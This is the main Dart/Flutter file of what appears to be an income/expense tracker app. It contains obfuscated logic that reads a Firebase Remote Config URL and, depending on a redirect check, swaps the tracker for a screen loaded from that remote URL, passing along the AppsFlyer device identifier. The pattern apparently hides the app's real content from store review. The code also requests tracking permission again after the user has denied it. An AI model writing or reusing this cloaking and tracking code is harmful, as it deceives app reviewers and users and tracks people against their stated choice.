import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter/services.dart';
import 'package:flutter/material.dart';

import 'core/config/my_colors.dart';
import 'core/config/router.dart';
import 'blocs/button/button_bloc.dart';
import 'blocs/navbar/navbar_bloc.dart';
import 'blocs/inc_exp/inc_exp_bloc.dart';
import 'features/settings/pages/firebase_options.dart';
import 'features/splash/onboard_page.dart';

late AppsflyerSdk _appsflyerSdk;
String kodpaskpda = '';
String jdioasjoasd = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await checsad();
  await efjaiofjdosf();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations(
      [DeviceOrientation.portraitUp, DeviceOrientation.portraitDown]);
  runApp(const App());
}

Future<void> efjaiofjdosf() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '4rYehnSYQsVcM2jmim5KyC',
      appId: '6738271311',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _appsflyerSdk = AppsflyerSdk(options);

    await _appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    jdioasjoasd = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer UID: $jdioasjoasd");

    _appsflyerSdk.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK started successfully");
      },
      onError: (int code, String message) {
        print("AppsFlyer SDK failed to start: code $code, message: $message");
      },
    );
  } catch (e) {
    print("Error initializing AppsFlyer: $e");
  }
}

Future<bool> checkPro() async {
  final prox = FirebaseRemoteConfig.instance;
  await prox.fetchAndActivate();
  String proxa = prox.getString('gmz');
  String userData = prox.getString('gmm');
  if (!proxa.contains('nox')) {
    final folx = HttpClient();
    final golxa = Uri.parse(proxa);
    final fosd = await folx.getUrl(golxa);
    fosd.followRedirects = false;
    final response = await fosd.close();
    if (response.headers.value(HttpHeaders.locationHeader) != userData) {
      kodpaskpda = proxa;
      return true;
    } else {
      return false;
    }
  }
  return proxa.contains('nox') ? false : true;
}

Future<void> checsad() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

class App extends StatelessWidget {
  const App({super.key});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
        future: checkPro(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && kodpaskpda != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainScreen(
                  consultant: kodpaskpda,
                  data: jdioasjoasd,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => IncExpBloc()),
                  BlocProvider(create: (context) => NavbarBloc()),
                  BlocProvider(create: (context) => ButtonBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: ThemeData(
                    scaffoldBackgroundColor: Colors.white,
                    useMaterial3: false,
                    primarySwatch: Colors.grey,
                    fontFamily: MyFonts.ns400,
                    colorScheme: ColorScheme.fromSwatch(
                      accentColor: MyColors.main,
                    ),
                    dialogTheme: const DialogTheme(
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.all(Radius.circular(18)),
                      ),
                    ),
                  ),
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
